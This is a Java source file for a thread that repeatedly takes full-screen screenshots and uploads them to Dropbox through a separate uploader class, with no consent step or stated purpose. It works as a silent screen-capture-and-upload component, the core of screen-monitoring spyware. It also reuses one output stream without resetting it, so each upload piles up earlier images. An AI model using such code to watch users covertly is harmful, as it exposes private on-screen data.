import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ScreenshotTread extends Thread {
    private DbxClientV2 client;
    public ScreenshotTread(DbxClientV2 client) {
        this.client = client;
    }
    @Override
    public void run() {
        BufferedImage image = null;
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        for (int i = 0; i < 15; i++) {
            try {
                image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ImageIO.write(image, "png", outputStream);
            } catch (Exception e) {
                e.printStackTrace();
            }
            UploaderToDropbox uploaderToDropbox = new UploaderToDropbox(client, outputStream);
            uploaderToDropbox.start();
            try {
                sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
